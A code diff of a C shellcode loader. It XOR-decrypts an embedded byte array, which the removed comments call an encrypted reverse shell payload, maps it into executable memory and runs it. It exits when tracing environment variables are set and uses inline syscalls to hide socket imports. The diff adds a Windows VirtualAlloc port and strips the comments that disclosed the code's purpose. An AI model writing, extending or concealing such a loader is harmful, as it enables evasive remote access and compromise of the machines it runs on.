@@ -1,19 +1,13 @@
 #include <stdio.h>
-#include <sys/socket.h>
-#include <arpa/inet.h>
-#include <unistd.h>
 #include <string.h>
 #include <stdlib.h>
-#include <sys/mman.h>
 
-// Simple XOR "encryption" (simulating AES)
 void decrypt_payload(unsigned char *payload, int len, unsigned char *key) {
-    for(int i = 0; i < len; i++) {
+    for (int i = 0; i < len; i++) {
         payload[i] ^= key[i % 16];
     }
 }
 
-// Encrypted reverse shell payload
 unsigned char encrypted_payload[] = {
     0x8c, 0x9f, 0x8d, 0x9e, 0x8a, 0x9b, 0x89, 0x98,
     0x86, 0x97, 0x85, 0x94, 0x82, 0x93, 0x81, 0x90,
@@ -28,12 +22,34 @@ unsigned char key[] = {
     0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0xba, 0xbe
 };
 
+#ifdef _WIN32
+#include <windows.h>
+
+int main(void) {
+    if (GetEnvironmentVariableA("STRACE", NULL, 0) || GetEnvironmentVariableA("LT_TRACE", NULL, 0))
+        return 0;
+
+    decrypt_payload(encrypted_payload, sizeof(encrypted_payload), key);
+
+    void *exec_mem = VirtualAlloc(NULL, sizeof(encrypted_payload),
+                                  MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!exec_mem) return 1;
+    memcpy(exec_mem, encrypted_payload, sizeof(encrypted_payload));
+    ((void (*)(void))exec_mem)();
+    VirtualFree(exec_mem, 0, MEM_RELEASE);
+    return 0;
+}
+#else
+#include <sys/mman.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+
 void hide_imports() {
-    // Manual syscalls to avoid imports
     asm volatile(
-        "mov $41, %%rax\n"  // socket syscall
-        "mov $2, %%rdi\n"   // AF_INET
-        "mov $1, %%rsi\n"   // SOCK_STREAM
+        "mov $41, %%rax\n"
+        "mov $2, %%rdi\n"
+        "mov $1, %%rsi\n"
         "xor %%rdx, %%rdx\n"
         "syscall\n"
         : : : "rax", "rdi", "rsi", "rdx"
@@ -41,23 +57,20 @@ void hide_imports() {
 }
 
 int main() {
-    // Anti-analysis checks
     if (getenv("STRACE") || getenv("LT_TRACE")) {
         return 0;
     }
-    
-    // Decrypt payload
+
     decrypt_payload(encrypted_payload, sizeof(encrypted_payload), key);
-    
-    // Copy to executable memory
-    void *exec_mem = mmap(NULL, sizeof(encrypted_payload), 
-                          PROT_READ | PROT_WRITE | PROT_EXEC,
-                          MAP_ANON | MAP_PRIVATE, -1, 0);
+
+    void *exec_mem = mmap(NULL, sizeof(encrypted_payload),
+                         PROT_READ | PROT_WRITE | PROT_EXEC,
+                         MAP_ANON | MAP_PRIVATE, -1, 0);
     memcpy(exec_mem, encrypted_payload, sizeof(encrypted_payload));
-    
-    // Execute
+
     void (*shell)() = exec_mem;
     shell();
-    
+
     return 0;
 }
+#endif
